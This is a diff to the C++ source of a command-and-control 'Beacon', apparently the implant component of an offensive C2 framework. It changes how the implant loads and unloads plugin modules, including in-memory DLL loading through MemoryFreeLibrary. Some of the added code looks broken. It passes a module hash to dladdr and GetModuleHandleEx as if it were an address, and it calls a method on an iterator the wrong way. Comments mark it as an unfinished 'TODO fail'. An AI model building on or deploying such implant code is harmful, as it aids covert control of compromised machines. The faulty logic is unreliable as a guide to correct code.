@@ -714,6 +714,24 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 
 		ModuleCmd* moduleCmd = construct();
 
+		// Check if the module is already loaded, if it is we free it and return
+		unsigned long long moduleHash = moduleCmd->getHash();
+
+		std::vector<unique_ptr<ModuleCmd>>::iterator object = 
+			find_if(m_moduleCmd.begin(), m_moduleCmd.end(),
+					[&](unique_ptr<ModuleCmd> & obj)
+					{ 
+						return obj->getHash() == moduleHash;
+					}
+					);
+
+		if(object!=m_moduleCmd.end())
+		{
+			c2RetMessage.set_errorCode(ERROR_MODULE_ALREADY_LOADED);
+			dlclose(handle);
+			return false;
+		}
+
 		std::unique_ptr<ModuleCmd> moduleCmd_(moduleCmd);
 		m_moduleCmd.push_back(std::move(moduleCmd_));
 
@@ -765,6 +783,24 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
     
         ModuleCmd* moduleCmd = construct();
 
+		// Check if the module is already loaded, if it is we free it and return
+		unsigned long long moduleHash = moduleCmd->getHash();
+
+		std::vector<unique_ptr<ModuleCmd>>::iterator object = 
+			find_if(m_moduleCmd.begin(), m_moduleCmd.end(),
+					[&](unique_ptr<ModuleCmd> & obj)
+					{ 
+						return obj->getHash() == moduleHash;
+					}
+					);
+
+		if(object!=m_moduleCmd.end())
+		{
+			c2RetMessage.set_errorCode(ERROR_MODULE_ALREADY_LOADED);
+			MemoryFreeLibrary(handle);
+			return false;
+		}
+
 		std::unique_ptr<ModuleCmd> moduleCmd_(moduleCmd);
 		m_moduleCmd.push_back(std::move(moduleCmd_));
 
@@ -793,6 +829,24 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 
 		if(object!=m_moduleCmd.end())
 		{
+#ifdef __linux__
+			// TODO fail !
+			Dl_info  DlInfo;
+			if ((dladdr((void*)((*object)->getHash()), &DlInfo)) != 0)
+			{
+				dlclose(DlInfo.dli_fbase);
+			}
+#elif _WIN32
+			HMODULE hModule = NULL;
+			if(GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
+				GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
+				(LPCTSTR)object->getHash(), &hModule))
+			{
+				// test with FreeLibrary, should use MemoryFreeLibrary ?
+				FreeLibrary(hModule);
+			}
+#endif
+			
 			m_moduleCmd.erase(std::remove(m_moduleCmd.begin(), m_moduleCmd.end(), *object));
 			c2RetMessage.set_returnvalue(CmdStatusSuccess);
 			return false;
